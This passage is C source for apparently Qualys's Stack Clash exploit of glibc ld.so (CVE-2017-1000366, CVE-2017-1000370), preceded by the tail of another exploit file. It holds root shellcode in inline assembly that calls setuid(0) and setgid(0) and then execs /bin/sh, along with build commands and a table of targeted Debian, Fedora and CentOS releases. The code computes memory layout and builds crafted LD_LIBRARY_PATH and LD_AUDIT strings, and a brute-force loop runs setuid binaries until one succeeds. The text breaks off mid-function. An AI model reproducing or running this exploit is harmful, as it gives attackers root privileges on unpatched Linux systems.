        if (write(fd, la_so, sizeof(la_so)) != (ssize_t)sizeof(la_so)) die();
      }
        if (fchmod(fd, 04755)) die();
        if (close(fd)) die();
    }
    if (target->disable_audit) create_needed_libs(binary, abs_la_dir);
  }

    size_t try;
    for (try = 1; try; try++) {
        if (fflush(stdout)) die();
        const pid_t pid = fork();
        if (pid <= -1) die();
        if (pid == 0) {
            if (dup2(pipefd[1], 1) != 1) die();
            if (dup2(pipefd[1], 2) != 2) die();
            execve(*argv, argv, envp);
            die();
        }
        int status = 0;
        struct timeval start, stop, diff;
        if (gettimeofday(&start, NULL)) die();
        if (waitpid(pid, &status, WUNTRACED) != pid) die();
        if (gettimeofday(&stop, NULL)) die();
        timersub(&stop, &start, &diff);
        printf("try %zu %ld.%06ld ", try, diff.tv_sec, diff.tv_usec);

        if (WIFSIGNALED(status)) {
            printf("signal %d\n", WTERMSIG(status));
            switch (WTERMSIG(status)) {
                case SIGPIPE:
                case SIGSEGV:
                case SIGBUS:
                    break;
                default:
                    die();
            }
        } else if (WIFEXITED(status)) {
            printf("exited %d\n", WEXITSTATUS(status));
            die();
        } else if (WIFSTOPPED(status)) {
            printf("stopped %d\n", WSTOPSIG(status));
            die();
        } else {
            printf("unknown %d\n", status);
            die();
        }
    }
    die();
}

--WIyZ46R2i8wDzkSu
Content-Type: text/plain; charset=us-ascii
Content-Disposition: attachment; filename="Linux_ldso_hwcap.c"

/*
 * Linux_ldso_hwcap.c for CVE-2017-1000366, CVE-2017-1000370
 * Copyright (C) 2017 Qualys, Inc.
 *
 * my_important_hwcaps() adapted from elf/dl-hwcaps.c,
 * part of the GNU C Library:
 * Copyright (C) 2012-2017 Free Software Foundation, Inc.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

/**
cat > la.c << "EOF"
static void __attribute__ ((constructor)) _init (void) {
    __asm__ __volatile__ (
    "addl $64, %esp;"
    // setuid(0);
    "movl $23, %eax;"
    "movl $0, %ebx;"
    "int $0x80;"
    // setgid(0);
    "movl $46, %eax;"
    "movl $0, %ebx;"
    "int $0x80;"
    // dup2(0, 1);
    "movl $63, %eax;"
    "movl $0, %ebx;"
    "movl $1, %ecx;"
    "int $0x80;"
    // dup2(0, 2);
    "movl $63, %eax;"
    "movl $0, %ebx;"
    "movl $2, %ecx;"
    "int $0x80;"
    // execve("/bin/sh");
    "movl $11, %eax;"
    "pushl $0x0068732f;"
    "pushl $0x6e69622f;"
    "movl %esp, %ebx;"
    "movl $0, %edx;"
    "pushl %edx;"
    "pushl %ebx;"
    "movl %esp, %ecx;"
    "int $0x80;"
    // exit(0);
    "movl $1, %eax;"
    "movl $0, %ebx;"
    "int $0x80;"
    );
}
EOF
gcc -fpic -shared -nostdlib -Os -s -o la.so la.c
xxd -i la.so > la.so.h
**/

#define _GNU_SOURCE
#include <assert.h>
#include <elf.h>
#include <fcntl.h>
#include <limits.h>
#include <link.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/param.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define PAGESZ ((size_t)4096)
#define STACK_ALIGN ((size_t)16)
#define MALLOC_ALIGN ((size_t)8)

#define MMAP_BASE ((uintptr_t)0x40000000)
#define MMAP_RAND ((size_t)1<<20)

#define STACK_BASE ((uintptr_t)0xC0000000)
#define STACK_RAND ((size_t)8<<20)

#define MAX_ARG_STRLEN ((size_t)128<<10)
#define MAX_ARG_STRINGS ((size_t)0x7FFFFFFF)

static const struct target * target;
static const struct target {
    const char * name;
    size_t memalign_up;
    size_t nsystem_dirs_len;
    size_t sizeof_system_dirs;
    const char * repl_lib;
    int ignore_lib;
    int ignore_origin;
} targets[] = {
    {
        .name = "Debian 7 (wheezy)",
        .memalign_up = PAGESZ,
        .nsystem_dirs_len = 4,
        .sizeof_system_dirs = sizeof("/lib/i386-linux-gnu/\0" "/usr/lib/i386-linux-gnu/\0" "/lib/\0" "/usr/lib/"),
        .repl_lib = "lib/i386-linux-gnu",
        .ignore_lib = 0,
        .ignore_origin = 0,
    },
    {
        .name = "Debian 8 (jessie)",
        .memalign_up = PAGESZ,
        .nsystem_dirs_len = 4,
        .sizeof_system_dirs = sizeof("/lib/i386-linux-gnu/\0" "/usr/lib/i386-linux-gnu/\0" "/lib/\0" "/usr/lib/"),
        .repl_lib = "lib/i386-linux-gnu",
        .ignore_lib = 0,
        .ignore_origin = 0,
    },
    {
        .name = "Debian 9 (stretch)",
        .memalign_up = 2 * PAGESZ,
        .nsystem_dirs_len = 4,
        .sizeof_system_dirs = sizeof("/lib/i386-linux-gnu/\0" "/usr/lib/i386-linux-gnu/\0" "/lib/\0" "/usr/lib/"),
        .repl_lib = "lib/i386-linux-gnu",
        .ignore_lib = 0,
        .ignore_origin = 0,
    },
    {
        .name = "Debian 10 (buster)",
        .memalign_up = 2 * PAGESZ,
        .nsystem_dirs_len = 4,
        .sizeof_system_dirs = sizeof("/lib/i386-linux-gnu/\0" "/usr/lib/i386-linux-gnu/\0" "/lib/\0" "/usr/lib/"),
        .repl_lib = "lib/i386-linux-gnu",
        .ignore_lib = 0,
        .ignore_origin = 0,
    },
    {
        .name = "Fedora 23 (Server Edition)",
        .memalign_up = PAGESZ,
        .nsystem_dirs_len = 2,
        .sizeof_system_dirs = sizeof("/lib/\0" "/usr/lib/"),
        .repl_lib = "lib",
        .ignore_lib = 0,
        .ignore_origin = 0,
    },
    {
        .name = "Fedora 24 (Server Edition)",
        .memalign_up = PAGESZ,
        .nsystem_dirs_len = 2,
        .sizeof_system_dirs = sizeof("/lib/\0" "/usr/lib/"),
        .repl_lib = "lib",
        .ignore_lib = 0,
        .ignore_origin = 0,
    },
    {
        .name = "Fedora 25 (Server Edition)",
        .memalign_up = 2 * PAGESZ,
        .nsystem_dirs_len = 2,
        .sizeof_system_dirs = sizeof("/lib/\0" "/usr/lib/"),
        .repl_lib = "lib",
        .ignore_lib = 0,
        .ignore_origin = 0,
    },
    {
        .name = "CentOS 5.3 (Final)",
        .memalign_up = PAGESZ,
        .nsystem_dirs_len = 2,
        .sizeof_system_dirs = sizeof("/lib/\0" "/usr/lib/"),
        .repl_lib = "lib",
        .ignore_lib = 1,
        .ignore_origin = 0,
    },
    {
        .name = "CentOS 5.11 (Final)",
        .memalign_up = PAGESZ,
        .nsystem_dirs_len = 2,
        .sizeof_system_dirs = sizeof("/lib/\0" "/usr/lib/"),
        .repl_lib = "lib",
        .ignore_lib = 0,
        .ignore_origin = 1,
    },
    {
        .name = "CentOS 6.0 (Final)",
        .memalign_up = PAGESZ,
        .nsystem_dirs_len = 2,
        .sizeof_system_dirs = sizeof("/lib/\0" "/usr/lib/"),
        .repl_lib = "lib",
        .ignore_lib = 0,
        .ignore_origin = 0,
    },
    {
        .name = "CentOS 6.8 (Final)",
        .memalign_up = PAGESZ,
        .nsystem_dirs_len = 2,
        .sizeof_system_dirs = sizeof("/lib/\0" "/usr/lib/"),
        .repl_lib = "lib",
        .ignore_lib = 0,
        .ignore_origin = 1,
    },
    {
        .name = "CentOS 7.2.1511 (AltArch)",
        .memalign_up = PAGESZ,
        .nsystem_dirs_len = 2,
        .sizeof_system_dirs = sizeof("/lib/\0" "/usr/lib/"),
        .repl_lib = "lib",
        .ignore_lib = 0,
        .ignore_origin = 0,
    },
};

#define die() do { \
    printf("died in %s: %u\n", __func__, __LINE__); \
    exit(EXIT_FAILURE); \
} while (0)

static const ElfW(auxv_t) * my_auxv;

static unsigned long int
my_getauxval (const unsigned long int type)
{
    const ElfW(auxv_t) * p;

    if (!my_auxv) die();
    for (p = my_auxv; p->a_type != AT_NULL; p++)
        if (p->a_type == type)
            return p->a_un.a_val;
    die();
}

static size_t
get_elf_mmaps(const char * const binary)
{
    if (!binary) die();
    if (*binary != '/') die();
    struct stat st;
    if (stat(binary, &st)) die();
    if (!S_ISREG(st.st_mode)) die();
    if (st.st_size <= 0) die();
    #define SAFESZ ((size_t)64<<20)
    if (st.st_size >= (ssize_t)SAFESZ) die();
    const size_t size = st.st_size;
    printf("%s %zu mmaps ", binary, size);

    const int fd = open(binary, O_RDONLY);
    if (fd <= -1) {
        const size_t mmaps = (size + PAGESZ-1) & ~(PAGESZ-1);
        printf("%zu (unreadable)\n", mmaps);
        return mmaps;
    }
    uint8_t * const buf = malloc(size);
    if (!buf) die();
    if (read(fd, buf, size) != (ssize_t)size) die();
    if (close(fd)) die();

    if (size <= sizeof(ElfW(Ehdr))) die();
    const ElfW(Ehdr) * const ehdr = (const ElfW(Ehdr) *)buf;
    if (ehdr->e_ident[EI_MAG0] != ELFMAG0) die();
    if (ehdr->e_ident[EI_MAG1] != ELFMAG1) die();
    if (ehdr->e_ident[EI_MAG2] != ELFMAG2) die();
    if (ehdr->e_ident[EI_MAG3] != ELFMAG3) die();
    if (ehdr->e_ident[EI_CLASS] != ELFCLASS32) die();
    if (ehdr->e_ident[EI_DATA] != ELFDATA2LSB) die();
    if (ehdr->e_machine != EM_386) die();
    if (ehdr->e_version != EV_CURRENT) die();
    if (ehdr->e_ehsize != sizeof(ElfW(Ehdr))) die();
    if (ehdr->e_phentsize != sizeof(ElfW(Phdr))) die();
    if (ehdr->e_shentsize != sizeof(ElfW(Shdr))) die();
    if (ehdr->e_phoff <= 0 || ehdr->e_phoff >= size) die();
    if (ehdr->e_shoff <= 0 || ehdr->e_shoff >= size) die();
    if (ehdr->e_phnum > (size - ehdr->e_phoff) / sizeof(ElfW(Phdr))) die();
    if (ehdr->e_shnum > (size - ehdr->e_shoff) / sizeof(ElfW(Shdr))) die();

    if (ehdr->e_type != ET_DYN) {
        if (ehdr->e_type != ET_EXEC) die();
        const size_t mmaps = 0;
        printf("%zu (executable)\n", mmaps);
        free(buf);
        return mmaps;
    }

    uintptr_t first_map_start = UINTPTR_MAX;
    uintptr_t last_map_end = 0;
    unsigned int i;
    for (i = 0; i < ehdr->e_phnum; i++) {
        const ElfW(Phdr) * const phdr = (const ElfW(Phdr) *)(buf + ehdr->e_phoff) + i;
        if (phdr->p_type != PT_LOAD) continue;

        if (phdr->p_offset >= size) die();
        if (phdr->p_filesz > size - phdr->p_offset) die();
        if (phdr->p_filesz > phdr->p_memsz) die();
        if (phdr->p_vaddr >= STACK_BASE) die();
        if (phdr->p_memsz <= 0) die();
        if (phdr->p_memsz >= SAFESZ) die();
        #undef SAFESZ
        if (phdr->p_align != PAGESZ) die();

        const uintptr_t map_start = phdr->p_vaddr & ~(PAGESZ-1);
        if (map_start >= UINTPTR_MAX) die();
        if (map_start < last_map_end) die();

        const uintptr_t map_end = (phdr->p_vaddr + phdr->p_memsz + PAGESZ-1) & ~(PAGESZ-1);
        if (map_end <= map_start) die();
        if (map_end <= 0) die();

        if (first_map_start >= UINTPTR_MAX) {
            first_map_start = map_start;
        }
        last_map_end = map_end;

        switch (phdr->p_flags) {
            case PF_R | PF_X:
                break;
            case PF_R | PF_W:
                if (map_start <= first_map_start) die();
                break;
            default:
                die();
        }
    }
    if (first_map_start >= UINTPTR_MAX) die();
    if (last_map_end <= 0) die();
    if (last_map_end <= first_map_start) die();
    const size_t mmaps = last_map_end - first_map_start;
    printf("%zu (%sshared object)\n", mmaps, first_map_start ? "prelinked " : "");
    free(buf);
    return mmaps;
}

static const char my_x86_cap_flags[32][8] = {
    "fpu", "vme", "de", "pse", "tsc", "msr", "pae", "mce",
    "cx8", "apic", "10", "sep", "mtrr", "pge", "mca", "cmov",
    "pat", "pse36", "pn", "clflush", "20", "dts", "acpi", "mmx",
    "fxsr", "sse", "sse2", "ss", "ht", "tm", "ia64", "pbe"
};

static const char my_x86_platforms[4][5] = {
    "i386", "i486", "i586", "i686"
};

static inline const char *
my_hwcap_string (const unsigned int idx)
{
    if (idx >= sizeof(my_x86_cap_flags) / sizeof(my_x86_cap_flags[0])) die();
    return my_x86_cap_flags[idx];
}

struct my_important_hwcaps {
    unsigned long hwcap_mask;
    size_t max_capstrlen;
    size_t pointers;
    size_t strings;
    size_t search_dirs;
    size_t search_dirs_0;
};

struct my_link_map {
    const ElfW(Phdr) * l_phdr;
    ElfW(Half) l_phnum;
    ElfW(Addr) l_addr;
};

/* We want to cache information about the searches for shared objects.  */

enum r_dir_status { unknown, nonexisting, existing };

struct r_search_path_elem
  {
    /* This link is only used in the `all_dirs' member of `r_search_path'.  */
    struct r_search_path_elem *next;

    /* Strings saying where the definition came from.  */
    const char *what;
    const char *where;

    /* Basename for this search path element.  The string must end with
       a slash character.  */
    const char *dirname;
    size_t dirnamelen;

    enum r_dir_status status[0];
  };

struct r_strlenpair
  {
    const char *str;
    size_t len;
  };

/* Return an array of useful/necessary hardware capability names.  */
static struct my_important_hwcaps
my_important_hwcaps (const char * const platform, const size_t platform_len,
                     const uint64_t hwcap, const uint64_t hwcap_mask,
                     const struct my_link_map * sysinfo_map)
{
  static const struct my_important_hwcaps err;
  /* Determine how many important bits are set.  */
  uint64_t masked = hwcap & hwcap_mask;
  size_t cnt = platform != NULL;
  size_t n, m;
  size_t total;
  struct r_strlenpair *result;

  /* Count the number of bits set in the masked value.  */
  for (n = 0; (~((1ULL << n) - 1) & masked) != 0; ++n)
    if ((masked & (1ULL << n)) != 0)
      ++cnt;

  /* The system-supplied DSO can contain a note of type 2, vendor "GNU".
     This gives us a list of names to treat as fake hwcap bits.  */

  const char *dsocaps = NULL;
  size_t dsocapslen = 0;
  if (sysinfo_map != NULL)
    {
      const ElfW(Phdr) *const phdr = sysinfo_map->l_phdr;
      const ElfW(Word) phnum = sysinfo_map->l_phnum;
      uint_fast16_t i;
      for (i = 0; i < phnum; ++i)
        if (phdr[i].p_type == PT_NOTE)
          {
            const ElfW(Addr) start = (phdr[i].p_vaddr
                                      + sysinfo_map->l_addr);
            /* The standard ELF note layout is exactly as the anonymous struct.
               The next element is a variable length vendor name of length
               VENDORLEN (with a real length rounded to ElfW(Word)), followed
               by the data of length DATALEN (with a real length rounded to
               ElfW(Word)).  */
            const struct
            {
              ElfW(Word) vendorlen;
              ElfW(Word) datalen;
              ElfW(Word) type;
            } *note = (const void *) start;
            while ((ElfW(Addr)) (note + 1) - start < phdr[i].p_memsz)
              {
#define ROUND(len) (((len) + sizeof (ElfW(Word)) - 1) & -sizeof (ElfW(Word)))
                /* The layout of the type 2, vendor "GNU" note is as follows:
                   .long <Number of capabilities enabled by this note>
                   .long <Capabilities mask> (as mask >> _DL_FIRST_EXTRA).
                   .byte <The bit number for the next capability>
                   .asciz <The name of the capability>.  */
                if (note->type == NT_GNU_HWCAP
                    && note->vendorlen == sizeof "GNU"
                    && !memcmp ((note + 1), "GNU", sizeof "GNU")
                    && note->datalen > 2 * sizeof (ElfW(Word)) + 2)
                  {
                    const ElfW(Word) *p = ((const void *) (note + 1)
                                           + ROUND (sizeof "GNU"));
                    cnt += *p++;
                    ++p;        /* Skip mask word.  */
                    dsocaps = (const char *) p; /* Pseudo-string "<b>name"  */
                    dsocapslen = note->datalen - sizeof *p * 2;
                    break;
                  }
                note = ((const void *) (note + 1)
                        + ROUND (note->vendorlen) + ROUND (note->datalen));
#undef ROUND
              }
            if (dsocaps != NULL)
              break;
          }
    }

  /* For TLS enabled builds always add 'tls'.  */
  ++cnt;

  /* Create temporary data structure to generate result table.  */
  if (cnt < 2) return err;
  if (cnt >= 32) return err;
  struct r_strlenpair temp[cnt];
  m = 0;
  if (dsocaps != NULL)
    {
      /* dsocaps points to the .asciz string, and -1 points to the mask
         .long just before the string.  */
      const ElfW(Word) mask = ((const ElfW(Word) *) dsocaps)[-1];
      size_t len;
      const char *p;
      for (p = dsocaps; p < dsocaps + dsocapslen; p += len + 1)
        {
          uint_fast8_t bit = *p++;
          len = strlen (p);

          /* Skip entries that are not enabled in the mask word.  */
          if (mask & ((ElfW(Word)) 1 << bit))
            {
              temp[m].str = p;
              temp[m].len = len;
              ++m;
            }
          else
            --cnt;
        }
    }
  for (n = 0; masked != 0; ++n)
    if ((masked & (1ULL << n)) != 0)
      {
        temp[m].str = my_hwcap_string (n);
        temp[m].len = strlen (temp[m].str);
        masked ^= 1ULL << n;
        ++m;
      }
  if (platform != NULL)
    {
      temp[m].str = platform;
      temp[m].len = platform_len;
      ++m;
    }

  temp[m].str = "tls";
  temp[m].len = 3;
  ++m;

  assert (m == cnt);

  /* Determine the total size of all strings together.  */
  if (cnt == 1)
    total = temp[0].len + 1;
  else
    {
      total = temp[0].len + temp[cnt - 1].len + 2;
      if (cnt > 2)
        {
          total <<= 1;
          for (n = 1; n + 1 < cnt; ++n)
            total += temp[n].len + 1;
          if (cnt > 3
              && (cnt >= sizeof (size_t) * 8
                  || total + (sizeof (*result) << 3)
                     >= (1UL << (sizeof (size_t) * 8 - cnt + 3))))
            return err;

          total <<= cnt - 3;
        }
    }

  /* The result structure: we use a very compressed way to store the
     various combinations of capability names.  */
  const size_t _sz = 1 << cnt;

  /* Now we are ready to install the string pointers and length.  */
  size_t max_capstrlen = 0;
  n = cnt;
  do
    {
      const size_t mask = 1 << --n;
      for (m = 1 << cnt; m > 0; ) {
        if ((--m & mask) != 0)
          max_capstrlen += temp[n].len + 1;
        break;
      }
    }
  while (n != 0);

  const size_t round_size =
      (2 * sizeof (struct r_search_path_elem) - 1 + _sz * sizeof (enum r_dir_status))
         / sizeof (struct r_search_path_elem);
  if (hwcap_mask > ULONG_MAX) die();

  const struct my_important_hwcaps ret = {
      .hwcap_mask = hwcap_mask,
      .max_capstrlen = max_capstrlen,
      .pointers = _sz * sizeof (*result),
      .strings = total,
      .search_dirs = (target->nsystem_dirs_len + 1) * sizeof (struct r_search_path_elem *),
      .search_dirs_0 = target->sizeof_system_dirs * round_size * sizeof (struct r_search_path_elem)
  };
  return ret;
}

static size_t
my_bsearch(const void * const key,
    const void * const base, const size_t nmemb, const size_t size,
    int (* const compar)(const void *, const void *))
{
    if (!key) die();
    if (!size) die();
    if (!compar) die();
    if (nmemb >= SSIZE_MAX / size) die();
    if (!base != !nmemb) die();
    if (!base || !nmemb) return 0;

    size_t low = 0;
    size_t high = nmemb - 1;
    while (low <= high) {
        const size_t mid = low + (high - low) / 2;
        if (mid >= nmemb) die();
        const int cond = compar(key, base + mid * size);
        switch (cond) {
        case 0:
            return mid;
        case -1:
            if (mid <= 0) {
                if (mid != 0) die();
                if (low != 0) die();
                return low;
            }
            high = mid - 1;
            break;
        case +1:
            low = mid + 1;
            break;
        default:
            die();
        }
    }
    if (low > nmemb) die();
    return low;
}

static int
cmp_important_hwcaps(const void * const _a, const void * const _b)
{
    const struct my_important_hwcaps * const a = _a;
    const struct my_important_hwcaps * const b = _b;

    if (a->strings < b->strings) return -1;
    if (a->strings > b->strings) return +1;

    if (a->pointers < b->pointers) return -1;
    if (a->pointers > b->pointers) return +1;

    if (a->search_dirs_0 < b->search_dirs_0) return -1;
    if (a->search_dirs_0 > b->search_dirs_0) return +1;

    if (a->max_capstrlen < b->max_capstrlen) return -1;
    if (a->max_capstrlen > b->max_capstrlen) return +1;

    return 0;
}

struct audit_list
{
  const char *name;
  struct audit_list *next;
};

int
main(const int my_argc, const char * const my_argv[], const char * const my_envp[])
{
  {
    const char * const * p = my_envp;
    while (*p++) ;
    my_auxv = (const void *)p;
  }
    if (my_getauxval(AT_PAGESZ) != PAGESZ) die();
  {
    struct timeval tv;
    if (gettimeofday(&tv, NULL)) die();
    srandom(getpid() ^ tv.tv_sec ^ tv.tv_usec);
  }
    if (my_argc != 1+2) {
        printf("Usage: %s target binary\n", my_argv[0]);
        size_t i;
        for (i = 0; i < sizeof(targets)/sizeof(*targets); i++) {
            printf("Target %zu %s\n", i, targets[i].name);
        }
        die();
    }
  {
    const size_t i = strtoul(my_argv[1], NULL, 10);
    if (i >= sizeof(targets)/sizeof(*targets)) die();
    target = targets + i;
    printf("Target %zu %s\n", i, target->name);
  }
    printf("mau %zu nsd %zu ssd %zu rl %s il %d io %d\n",
        target->memalign_up, target->nsystem_dirs_len, target->sizeof_system_dirs,
        target->repl_lib, target->ignore_lib, target->ignore_origin);

    if (target->memalign_up % PAGESZ) die();
    if (target->ignore_lib < 0 || target->ignore_origin < 0) die();
    if (target->ignore_lib > 1 || target->ignore_origin > 1) die();

    const char * const binary = realpath(my_argv[2], NULL);
    if (!binary) die();
    if (*binary != '/') die();
    if (access(binary, X_OK)) die();

    const char * const slash = strrchr(binary, '/');
    if (!slash) die();
    if (slash <= binary) die();
    const char * const origin = strndup(binary, slash - binary);
    if (!origin) die();
    printf("origin %s (%zu)\n", origin, strlen(origin));

    const char * const platform = (const void *)my_getauxval(AT_PLATFORM);
    if (!platform) die();
    const size_t platform_len = strlen(platform);
    if (platform_len != 4) die();
  {
    size_t i;
    for (i = 0; ; i++) {
        if (i >= sizeof(my_x86_platforms) / sizeof(my_x86_platforms[0])) die();
        if (strcmp(platform, my_x86_platforms[i]) == 0) break;
    }
  }
    const struct {
        const char * str;
        size_t len;
        size_t repl_len;
    } DSTs[] = {
        #define DST_LIB "LIB"
        { DST_LIB, strlen(DST_LIB), strlen(target->repl_lib) },
        #define DST_PLATFORM "PLATFORM"
        { DST_PLATFORM, strlen(DST_PLATFORM), platform_len }
    };
    size_t repl_max = target->ignore_origin ? 0 : strlen(origin);
  {
    size_t i;
    for (i = target->ignore_lib ? 1 : 0; i < sizeof(DSTs)/sizeof(*DSTs); i++) {
        if (repl_max < DSTs[i].repl_len)
            repl_max = DSTs[i].repl_len;
    }
  }
    printf("repl_max %zu\n", repl_max);
    if (repl_max < 4) die();

    const ElfW(Ehdr) * const sysinfo_dso = (const void *)my_getauxval(AT_SYSINFO_EHDR);
    if (!sysinfo_dso) die();
    struct my_link_map sysinfo_map = {
        .l_phdr = (const void *)sysinfo_dso + sysinfo_dso->e_phoff,
        .l_phnum = sysinfo_dso->e_phnum,
        .l_addr = ULONG_MAX
    };
  {
    uint_fast16_t i;
    for (i = 0; i < sysinfo_map.l_phnum; ++i) {
        const ElfW(Phdr) * const ph = &sysinfo_map.l_phdr[i];
        if (ph->p_type == PT_LOAD) {
            if (sysinfo_map.l_addr == ULONG_MAX)
                sysinfo_map.l_addr = ph->p_vaddr;
        }
    }
  }
    if (sysinfo_map.l_addr == ULONG_MAX) die();
    sysinfo_map.l_addr = (ElfW(Addr))sysinfo_dso - sysinfo_map.l_addr;

    const unsigned long hwcap = my_getauxval(AT_HWCAP);
    if (!hwcap) die();
    struct my_important_hwcaps * important_hwcaps = NULL;
    size_t num_important_hwcaps = 0;
  {
    size_t max_important_hwcaps = 0;
    uint32_t hwcap_mask = 1;
    do {
        if (hwcap_mask & ~hwcap) continue;
        const uint64_t popcount = __builtin_popcount(hwcap_mask);
        if (popcount < 1) die();
        if (popcount > 32) die();
        if ((((2+1) * (2*2 + popcount)) << (popcount-1)) + PAGESZ
            >= MAX_ARG_STRLEN + (MAX_ARG_STRLEN / (4+1)) * (repl_max - (target->ignore_lib ? 7 : 4))) continue;

        const struct my_important_hwcaps ihc = my_important_hwcaps(platform, platform_len, hwcap, hwcap_mask, &sysinfo_map);
        if (!ihc.pointers) die();

        const size_t idx = my_bsearch(&ihc, important_hwcaps, num_important_hwcaps, sizeof(struct my_important_hwcaps), cmp_important_hwcaps);
        if (idx > num_important_hwcaps) die();

        if (idx == num_important_hwcaps || cmp_important_hwcaps(&ihc, important_hwcaps + idx)) {
            if (num_important_hwcaps >= max_important_hwcaps) {
                if (num_important_hwcaps != max_important_hwcaps) die();
                if (max_important_hwcaps >= 65536) die();
                max_important_hwcaps += 256;

                if (num_important_hwcaps >= max_important_hwcaps) die();
                important_hwcaps = realloc(important_hwcaps, max_important_hwcaps * sizeof(struct my_important_hwcaps));
                if (!important_hwcaps) die();
            }
            memmove(important_hwcaps + idx + 1, important_hwcaps + idx, (num_important_hwcaps - idx) * sizeof(struct my_important_hwcaps));
            important_hwcaps[idx] = ihc;
            num_important_hwcaps++;
        }
    } while (++hwcap_mask);
  }
    printf("num_important_hwcaps %zu\n", num_important_hwcaps);

    static struct {
        double probability;
        struct my_important_hwcaps ihc;
        size_t gwr, dst, cnt;
    } best;

    #define LIB "/lib"
    #define SEP_LIB ":" LIB
    #define LLP "LD_LIBRARY_PATH="
    static char llp[MAX_ARG_STRLEN];
    #define MAX_GWR ((sizeof(llp) - (sizeof(LLP)-1 + sizeof(SEP_LIB)-1 + 1)) & ~(MALLOC_ALIGN-1))
    size_t gwr;
    for (gwr = MAX_GWR; gwr >= 128; gwr -= MALLOC_ALIGN) {
        size_t dst;
        for (dst = 0; dst < sizeof(DSTs)/sizeof(*DSTs); dst++) {
            const size_t cnt = (MAX_GWR - gwr) / (1 + DSTs[dst].len + 1);
            const size_t gpj = (sizeof(SEP_LIB)-1 + MAX_GWR + cnt * (repl_max - (target->ignore_lib ? 7 : 4)) + 1 + STACK_ALIGN-1) & ~(STACK_ALIGN-1);
            const size_t bwr = (sizeof(SEP_LIB)-1 + cnt * (DSTs[dst].repl_len + 1)) + ((MAX_GWR - gwr) - cnt * (1 + DSTs[dst].len + 1)) + 1;

            const struct my_important_hwcaps key = { .strings = gwr + bwr };
            if (key.pointers) die();

            size_t idx = my_bsearch(&key, important_hwcaps, num_important_hwcaps, sizeof(struct my_important_hwcaps), cmp_important_hwcaps);
            for (; idx < num_important_hwcaps; idx++) {
                const struct my_important_hwcaps ihc = important_hwcaps[idx];
                if (ihc.strings < gwr + bwr) die();
                if (ihc.max_capstrlen % MALLOC_ALIGN >= sizeof("/..")) continue;
                if (ihc.search_dirs_0 >= STACK_RAND) continue;

                const size_t min = MIN(gwr, ihc.pointers);
                if (gpj < min + ihc.strings + ihc.search_dirs + 2 * target->memalign_up + 2 * PAGESZ + (target->ignore_origin ? 0 : PATH_MAX)) continue;

                const double probability =
                    (double)((uint64_t)(STACK_RAND - ihc.search_dirs_0) * (uint64_t)min) /
                    (double)((uint64_t)STACK_RAND * (uint64_t)(MMAP_RAND + (STACK_RAND - ihc.search_dirs_0)));
                if (best.probability < probability) {
                    best.probability = probability;
                    best.ihc = ihc;
                    best.gwr = gwr;
                    best.dst = dst;
                    best.cnt = cnt;
                    printf("len %zu ihcp %zu ihcs %zu sd %zu sd0 %zu gpj %zu gwr %zu bwr %zu cnt %zu dst %zu repl %zu probability 1/%zu (%.10g) mask %lx\n",
                        ihc.max_capstrlen, ihc.pointers, ihc.strings, ihc.search_dirs, ihc.search_dirs_0, gpj, gwr, bwr, cnt, DSTs[dst].len, DSTs[dst].repl_len,
                        (size_t)(1 / probability), probability, ihc.hwcap_mask);
                }
            }
        }
    }
    if (!best.probability) die();
    if (STACK_BASE <= MMAP_BASE) die();
    const size_t mmap_size = ((STACK_BASE - MMAP_BASE) / 2) - MMAP_RAND / 2
        - (get_elf_mmaps(binary) + get_elf_mmaps("/lib/ld-linux.so.2") + best.ihc.pointers + best.ihc.strings + best.ihc.search_dirs);
    const size_t stack_size = ((STACK_BASE - MMAP_BASE) / 2) - ((STACK_RAND + best.ihc.search_dirs_0) / 2);
    printf("mmap_size %zu stack_size %zu\n", mmap_size, stack_size);

    #define REL_LA "a"
    #define LDA "LD_AUDIT="
    static char lda[MAX_ARG_STRLEN];
    #define MAX_RLDAS ((sizeof(lda) - sizeof(LDA)) / sizeof(REL_LA))
    if (sizeof(struct audit_list) % MALLOC_ALIGN) die();
    const size_t ldas = (mmap_size / sizeof(struct audit_list)) / MAX_RLDAS;
    if (ldas >= MAX_ARG_STRINGS / 3) die();

    #define INITIAL_STACK_EXPANSION (131072UL)
    const size_t pads = INITIAL_STACK_EXPANSION / sizeof(char *) - ldas;
    if (pads >= INITIAL_STACK_EXPANSION / sizeof(char *)) die();
    if (pads >= MAX_ARG_STRINGS / 3) die();
    static char pad[MAX_ARG_STRLEN];
  {
    const size_t padl = (stack_size - sizeof(llp) - ldas * (sizeof(lda) + sizeof(char *)) - pads * sizeof(char *)) / pads;
    if (padl >= sizeof(pad)) die();
    if (padl <= 0) die();
    memset(pad, ' ', padl-1);
    printf("ldas %zu pads %zu padl %zu\n", ldas, pads, padl);
  }

  {
    char * cp = mempcpy(llp, LLP, sizeof(LLP)-1);
    memset(cp, '/', MAX_GWR);
    memcpy(cp + MAX_GWR, SEP_LIB, sizeof(SEP_LIB)-1);
    if (*(cp + MAX_GWR + sizeof(SEP_LIB)-1)) die();

    #define LIB_TO_TMP "/../tmp/"
    if (sizeof(LIB_TO_TMP)-1 != MALLOC_ALIGN) die();

    if (!best.gwr) die();
    if (best.gwr >= MAX_GWR) die();
    if (best.gwr % MALLOC_ALIGN) die();
    size_t i;
    for (i = 0; i < best.gwr / MALLOC_ALIGN; i++) {
        cp = mempcpy(cp, LIB_TO_TMP, MALLOC_ALIGN);
    }
    if (!best.cnt) die();
    if (best.dst >= sizeof(DSTs)/sizeof(*DSTs)) die();
    for (i = 0; i < best.cnt; i++) {
        *cp++ = '$';
        cp = mempcpy(cp, DSTs[best.dst].str, DSTs[best.dst].len);
        *cp++ = '/';
    }
    if (cp >= llp + sizeof(llp)) die();
    if (llp[sizeof(llp)-1]) die();
  }

    #define LHCM "LD_HWCAP_MASK="
    static char lhcm[64];
    if ((unsigned int)snprintf(lhcm, sizeof(lhcm), "%s%lu", LHCM, best.ihc.hwcap_mask)
                                  >= sizeof(lhcm)) die();
  {
    char * cp = mempcpy(lda, LDA, sizeof(LDA)-1);
    size_t i;
